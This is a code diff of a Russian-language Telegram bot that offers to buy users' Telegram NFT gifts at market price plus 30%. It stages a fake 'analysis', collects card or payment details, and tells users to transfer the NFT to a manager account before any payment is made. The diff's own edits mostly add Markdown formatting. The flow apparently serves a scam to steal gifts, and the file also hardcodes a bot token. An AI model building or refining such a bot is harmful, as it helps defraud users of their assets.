@@ -9,7 +9,7 @@ import asyncio
 
 # Настройка логирования
 logging.basicConfig(
-    format='%(astime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
@@ -17,7 +17,7 @@ logger = logging.getLogger(__name__)
 # Конфигурация
 TOKEN = "8646107306:AAGlmH0RcrrPg39pakoM7RXI8BEWpl9FmwM"
 ADMIN_IDS = []  # Добавьте свой ID
-MANAGER_USERNAME = "buyer_supportz"  # Юзернейм менеджера
+MANAGER_USERNAME = "buyer_supportz"
 
 # Путь к файлу с фото (должен лежать в той же папке)
 PHOTO_FILE = "bot_photo.jpg"
@@ -348,12 +348,12 @@ async def start_selling(query, context):
     context.user_data['state'] = 'waiting_for_link'
     
     text = (
-        "🔗 Отправьте ссылку на ваш NFT-подарок\n\n"
-        "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
-        "📌 Примеры:\n"
-        "• https://t.me/nft/DurovsCap-1\n"
-        "• https://t.me/nft/HeartLocket-2\n"
-        "• https://t.me/nft/PlushPepe-3\n\n"
+        "🔗 **Отправьте ссылку на ваш NFT-подарок**\n\n"
+        "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
+        "📌 **Примеры:**\n"
+        "• `https://t.me/nft/DurovsCap-1`\n"
+        "• `https://t.me/nft/HeartLocket-2`\n"
+        "• `https://t.me/nft/PlushPepe-3`\n\n"
         "⚠️ Принимаются только NFT-подарки Telegram"
     )
     
@@ -387,12 +387,12 @@ async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not nft_data:
         text = (
-            "❌ Неправильный формат ссылки!\n\n"
-            "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
-            "📌 Примеры правильных ссылок:\n"
-            "• https://t.me/nft/DurovsCap-1\n"
-            "• https://t.me/nft/HeartLocket-2\n"
-            "• https://t.me/nft/PlushPepe-3\n\n"
+            "❌ **Неправильный формат ссылки!**\n\n"
+            "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
+            "📌 **Примеры правильных ссылок:**\n"
+            "• `https://t.me/nft/DurovsCap-1`\n"
+            "• `https://t.me/nft/HeartLocket-2`\n"
+            "• `https://t.me/nft/PlushPepe-3`\n\n"
             "Попробуйте снова:"
         )
         
@@ -410,7 +410,8 @@ async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Отправляем сообщение о начале анализа
     analyzing_msg = await update.message.reply_text(
-        "🔍 Анализируем ваш NFT...\nПожалуйста, подождите несколько секунд."
+        "🔍 **Анализируем ваш NFT...**\nПожалуйста, подождите несколько секунд.",
+        parse_mode='Markdown'
     )
     
     # Имитируем процесс анализа
@@ -423,7 +424,7 @@ async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Если подарок не найден в базе
         await analyzing_msg.delete()
         text = (
-            "❌ Подарок не найден в нашей базе!\n\n"
+            "❌ **Подарок не найден в нашей базе!**\n\n"
             f"Название: {nft_data['name']}\n\n"
             "Пожалуйста, проверьте правильность названия или обратитесь к менеджеру для ручной оценки."
         )
@@ -458,11 +459,11 @@ async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Показываем результат оценки
     text = (
-        "✅ Анализ NFT завершён!\n\n"
-        f"📎 Ваш NFT: {nft_data['full_link']}\n"
-        f"🏷 Рыночная стоимость: {market_rub:,} ₽ / {market_stars:,} ⭐️\n"
-        f"💰 Наше предложение (+30%): {our_rub:,} ₽ / {our_stars:,} ⭐️\n\n"
-        "Выберите способ получения оплаты:"
+        "✅ **🔍 Анализ NFT завершён!**\n\n"
+        f"📎 **Ваш NFT:** {nft_data['full_link']}\n"
+        f"🏷 **Рыночная стоимость:** {market_rub:,} ₽ / {market_stars:,} ⭐️\n"
+        f"💰 **Наше предложение (+30%):** {our_rub:,} ₽ / {our_stars:,} ⭐️\n\n"
+        "**Выберите способ получения оплаты:**"
     )
     
     keyboard = [
@@ -493,11 +494,11 @@ async def select_payment_rub(query, context):
     nft_info = context.user_data.get('nft_info', {})
     
     text = (
-        f"💳 Способ оплаты: 🇷🇺 Карта — Россия (RUB)\n\n"
-        f"📎 Ваш NFT: {nft_info.get('link')}\n"
-        f"🏷 Рыночная стоимость: ~{nft_info.get('market_rub'):,} ₽\n"
-        f"💰 Наше предложение: {nft_info.get('our_rub'):,} ₽ (+30%)\n\n"
-        "📝 Введите ваши реквизиты для получения оплаты:\n"
+        f"💳 **Способ оплаты:** 🇷🇺 Карта — Россия (RUB)\n\n"
+        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
+        f"🏷 **Рыночная стоимость:** ~{nft_info.get('market_rub'):,} ₽\n"
+        f"💰 **Наше предложение:** {nft_info.get('our_rub'):,} ₽ (+30%)\n\n"
+        "📝 **Введите ваши реквизиты для получения оплаты:**\n"
         "(Номер карты, телефон и т.д.)"
     )
     
@@ -516,11 +517,11 @@ async def select_payment_stars(query, context):
     nft_info = context.user_data.get('nft_info', {})
     
     text = (
-        f"💳 Способ оплаты: ⭐️ Звезды (Telegram Stars)\n\n"
-        f"📎 Ваш NFT: {nft_info.get('link')}\n"
-        f"🏷 Рыночная стоимость: ~{nft_info.get('market_stars'):,} ⭐️\n"
-        f"💰 Наше предложение: {nft_info.get('our_stars'):,} ⭐️ (+30%)\n\n"
-        "📝 Введите ваш @username для получения оплаты:"
+        f"💳 **Способ оплаты:** ⭐️ Звезды (Telegram Stars)\n\n"
+        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
+        f"🏷 **Рыночная стоимость:** ~{nft_info.get('market_stars'):,} ⭐️\n"
+        f"💰 **Наше предложение:** {nft_info.get('our_stars'):,} ⭐️ (+30%)\n\n"
+        "📝 **Введите ваш @username для получения оплаты:**"
     )
     
     keyboard = [[InlineKeyboardButton("◀️ Назад к выбору оплаты", callback_data='back_to_payment')]]
@@ -535,11 +536,11 @@ async def back_to_payment(query, context):
     context.user_data['state'] = 'awaiting_payment'
     
     text = (
-        "✅ Анализ NFT завершён!\n\n"
-        f"📎 Ваш NFT: {nft_info.get('link')}\n"
-        f"🏷 Рыночная стоимость: {nft_info.get('market_rub'):,} ₽ / {nft_info.get('market_stars'):,} ⭐️\n"
-        f"💰 Наше предложение (+30%): {nft_info.get('our_rub'):,} ₽ / {nft_info.get('our_stars'):,} ⭐️\n\n"
-        "Выберите способ получения оплаты:"
+        "✅ **🔍 Анализ NFT завершён!**\n\n"
+        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
+        f"🏷 **Рыночная стоимость:** {nft_info.get('market_rub'):,} ₽ / {nft_info.get('market_stars'):,} ⭐️\n"
+        f"💰 **Наше предложение (+30%):** {nft_info.get('our_rub'):,} ₽ / {nft_info.get('our_stars'):,} ⭐️\n\n"
+        "**Выберите способ получения оплаты:**"
     )
     
     keyboard = [
@@ -572,12 +573,12 @@ async def handle_payment_details(update: Update, context: ContextTypes.DEFAULT_T
         currency = '⭐️'
     
     text = (
-        f"📎 Ваш NFT: {nft_info.get('link')}\n"
-        f"💳 Способ оплаты: {payment_name}\n\n"
-        f"🏷 Рыночная стоимость: ~{market:,} {currency}\n"
-        f"💰 Наше предложение: {amount:,} {currency}\n\n"
+        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
+        f"💳 **Способ оплаты:** {payment_name}\n\n"
+        f"🏷 **Рыночная стоимость:** ~{market:,} {currency}\n"
+        f"💰 **Наше предложение:** {amount:,} {currency}\n\n"
         f"💬 Я предлагаю вам за ваш NFT {nft_info.get('link')} сумму {amount:,} {currency}\n\n"
-        "Если согласны — нажмите Да, если нет — Нет 👇"
+        "Если согласны — нажмите **Да**, если нет — **Нет** 👇"
     )
     
     keyboard = [
@@ -630,14 +631,14 @@ async def confirm_deal(query, context):
     save_data(data)
     
     text = (
-        f"✅ Отлично!\n\n"
+        f"✅ **Отлично!**\n\n"
         f"Теперь вам нужно отправить ваш NFT менеджеру @{MANAGER_USERNAME}\n\n"
-        f"📎 NFT: {nft_info.get('link')}\n"
-        f"💵 Сумма выплаты: {amount:,} {currency}\n"
-        f"💳 Способ оплаты: {payment_name}\n\n"
+        f"📎 **NFT:** {nft_info.get('link')}\n"
+        f"💵 **Сумма выплаты:** {amount:,} {currency}\n"
+        f"💳 **Способ оплаты:** {payment_name}\n\n"
         f"Менеджер проверит подарок и переведёт оплату на ваши реквизиты.\n"
         f"⚡️ Среднее время сделки: 5–15 минут\n\n"
-        f"⚠️ Важно: передавайте NFT ТОЛЬКО через @{MANAGER_USERNAME}. "
+        f"⚠️ **Важно:** передавайте NFT ТОЛЬКО через @{MANAGER_USERNAME}. "
         f"Мы не несём ответственности за сделки вне официального канала."
     )
     
@@ -673,9 +674,9 @@ async def gift_sent(query, context):
     save_data(data)
     
     text = (
-        f"✅ Спасибо! Менеджер уведомлен о передаче подарка.\n\n"
-        f"📎 NFT: {nft_info.get('link')}\n"
-        f"💵 Сумма выплаты: {amount:,} {currency}\n\n"
+        f"✅ **Спасибо! Менеджер уведомлен о передаче подарка.**\n\n"
+        f"📎 **NFT:** {nft_info.get('link')}\n"
+        f"💵 **Сумма выплаты:** {amount:,} {currency}\n\n"
         f"Ожидайте поступления оплаты в течение 5–15 минут.\n"
         f"Если возникнут вопросы, обращайтесь к @{MANAGER_USERNAME}"
     )
@@ -690,12 +691,12 @@ async def gift_sent(query, context):
     for admin_id in ADMIN_IDS:
         try:
             admin_text = (
-                f"📦 Подарок передан!\n\n"
-                f"👤 Пользователь: @{query.from_user.username}\n"
-                f"🆔 ID: {query.from_user.id}\n"
-                f"📎 NFT: {nft_info.get('link')}\n"
-                f"💰 Сумма: {amount:,} {currency}\n"
-                f"⏰ Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
+                f"📦 **Подарок передан!**\n\n"
+                f"👤 **Пользователь:** @{query.from_user.username}\n"
+                f"🆔 **ID:** {query.from_user.id}\n"
+                f"📎 **NFT:** {nft_info.get('link')}\n"
+                f"💰 **Сумма:** {amount:,} {currency}\n"
+                f"⏰ **Время:** {datetime.now().strftime('%d.%m.%Y %H:%M')}"
             )
             await context.bot.send_message(admin_id, admin_text, parse_mode='Markdown')
         except Exception as e:
@@ -719,12 +720,12 @@ async def check_another(query, context):
     context.user_data['state'] = 'waiting_for_link'
     
     text = (
-        "🔗 Отправьте ссылку на другой NFT-подарок\n\n"
-        "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
-        "📌 Примеры:\n"
-        "• https://t.me/nft/DurovsCap-1\n"
-        "• https://t.me/nft/HeartLocket-2\n"
-        "• https://t.me/nft/PlushPepe-3"
+        "🔗 **Отправьте ссылку на другой NFT-подарок**\n\n"
+        "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
+        "📌 **Примеры:**\n"
+        "• `https://t.me/nft/DurovsCap-1`\n"
+        "• `https://t.me/nft/HeartLocket-2`\n"
+        "• `https://t.me/nft/PlushPepe-3`"
     )
     
     keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
@@ -747,14 +748,14 @@ async def cancel_sale(query, context):
 async def show_instructions(query, context):
     """Инструкция по сделке"""
     instructions = (
-        "🤝 Как проводится сделка:\n\n"
+        "🤝 **Как проводится сделка:**\n\n"
         "1. Вы присылаете ссылку на NFT-подарок\n"
         "2. Бот находит цену в базе данных\n"
         "3. Вы выбираете способ оплаты\n"
         "4. Бот озвучивает свою сумму в вашей валюте (+30%)\n\n"
         "Пример: Я предлагаю вам за ваш NFT https://t.me/nft/HeartLocket-2 — 562,900 Рублей\n"
         "Если согласны — нажмите Да, если нет — Нет\n\n"
-        "5. При согласии — отправьте NFT менеджеру @buyer_supportz\n"
+        "5. При согласии — отправьте NFT менеджеру @buyer\\_supportz\n"
         "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
         "⚡️ Среднее время сделки: 5–15 минут"
     )
@@ -768,9 +769,9 @@ async def show_instructions(query, context):
 async def show_support(query, context):
     """Поддержка"""
     support_text = (
-        "🆘 Поддержка\n\n"
-        f"По всем вопросам обращайтесь к менеджеру @{MANAGER_USERNAME}\n\n"
-        "⏰ Время работы: 24/7\n\n"
+        "🆘 **Поддержка**\n\n"
+        f"По всем вопросам обращайтесь к менеджеру @buyer\\_supportz\n\n"
+        "⏰ **Время работы:** 24/7\n\n"
         "Среднее время ответа: 5-10 минут"
     )
     
@@ -821,12 +822,12 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     gift_sent = sum(1 for t in data["transactions"] if t["status"] == "gift_sent")
     
     stats = (
-        f"📊 Статистика бота\n\n"
-        f"👥 Пользователей: {total_users}\n"
-        f"📦 Всего транзакций: {total_transactions}\n"
-        f"⏳ В обработке: {pending}\n"
-        f"✅ Подтверждено: {confirmed}\n"
-        f"📤 Подарков передано: {gift_sent}\n"
+        f"📊 **Статистика бота**\n\n"
+        f"👥 **Пользователей:** {total_users}\n"
+        f"📦 **Всего транзакций:** {total_transactions}\n"
+        f"⏳ **В обработке:** {pending}\n"
+        f"✅ **Подтверждено:** {confirmed}\n"
+        f"📤 **Подарков передано:** {gift_sent}\n"
     )
     
     await update.message.reply_text(stats, parse_mode='Markdown')
